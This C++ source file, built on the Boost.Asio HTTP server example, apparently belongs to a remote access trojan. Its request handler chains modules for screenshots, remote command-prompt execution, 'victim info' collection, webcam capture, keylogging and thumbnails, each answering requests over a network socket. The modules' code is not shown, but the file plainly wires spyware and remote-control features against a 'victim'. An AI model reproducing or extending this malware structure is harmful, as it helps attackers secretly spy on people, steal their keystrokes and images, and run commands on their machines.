//
// request_handler.cpp
// ~~~~~~~~~~~~~~~~~~~
//
// Copyright (c) 2003-2015 Christopher M. Kohlhoff (chris at kohlhoff dot com)
//
// Distributed under the Boost Software License, Version 1.0. (See accompanying
// file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
//

#include "request_handler.hpp"
#include "command_prompt_executor.h"
#include "victim_info.h"
#include "webcam_shot.h"
#include <boost/smart_ptr/make_shared.hpp>
#include "keyboard_logger.hpp"
#include "thumbnail_executor.h"

namespace http {
namespace server {

request_handler::request_handler(boost::asio::ip::tcp::socket& sock, boost::asio::io_service& io_ref): socket_(sock), io_ref_(io_ref)
{
	rootHandler = std::make_unique<ScreenshotTaker>(sock, io_ref_);
	std::unique_ptr<TaskHandlerInterface> cmdHandler = std::make_unique<CommandPromptExecutor>(sock, io_ref_);
	std::unique_ptr<VictimInfoGenerator> vInfoGenHandler = std::make_unique<VictimInfoGenerator>(sock, io_ref_);
	std::unique_ptr<WebcamShot> webCamShotHandler = std::make_unique<WebcamShot>(sock, io_ref_);
	std::unique_ptr<Keylogger> keyLoggerHandler = std::make_unique<Keylogger>(sock, io_ref_);
	std::unique_ptr<ThumbnailTaker> thumbnailTakerHandler = std::make_unique <ThumbnailTaker>(sock, io_ref_);

	keyLoggerHandler->setNextTask(std::move(thumbnailTakerHandler));
	webCamShotHandler->setNextTask(std::move(keyLoggerHandler));
	vInfoGenHandler->setNextTask(std::move(webCamShotHandler));
	cmdHandler->setNextTask(std::move(vInfoGenHandler));
	rootHandler->setNextTask(std::move(cmdHandler));
}


void request_handler::handle_request(std::shared_ptr<request> req) const
{
	rootHandler->handleTask(req);
}

} // namespace server
} // namespace http